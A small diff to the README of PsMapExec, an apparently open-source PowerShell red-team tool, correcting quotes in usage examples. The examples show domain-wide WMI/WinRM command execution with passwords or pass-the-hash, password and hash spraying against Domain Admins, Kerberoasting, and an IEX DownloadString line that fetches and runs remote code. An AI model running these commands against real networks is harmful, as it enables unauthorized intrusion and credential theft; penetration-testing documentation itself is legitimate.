@@ -48,10 +48,10 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubuserconte
 ### Quick examples
 ```powershell
 # Execute WMI commands over all systems in the domain using password authentication
- PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command ""net user""
+ PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command "net user"
 
 # Execute WinRM commands over all systems in the domain using hash authentication
-PsMapExec -Targets all -Method WinRM -Username Admin -Hash [Hash] -Command ""net user""
+PsMapExec -Targets all -Method WinRM -Username Admin -Hash [Hash] -Command "net user"
 
 # Check RDP Access against workstations in the domain and using local authentication
 PsMapExec -Targets Workstations -Method RDP -Username LocalAdmin -Password Pass -LocalAuth
@@ -75,7 +75,7 @@ PsMapExec -Method Spray -SprayPassword [Password]
 PsMapExec -Method Spray -SprayHash [Hash]
 
 # Spray Hashes across all Domain Admin group users
-PsMapExec -Targets ""Domain Admins"" -Method Spray -SprayHash [Hash]
+PsMapExec -Targets "Domain Admins" -Method Spray -SprayHash [Hash]
 
 # Kerberoast 
 PsMapExec -Method Kerberoast -ShowOutput
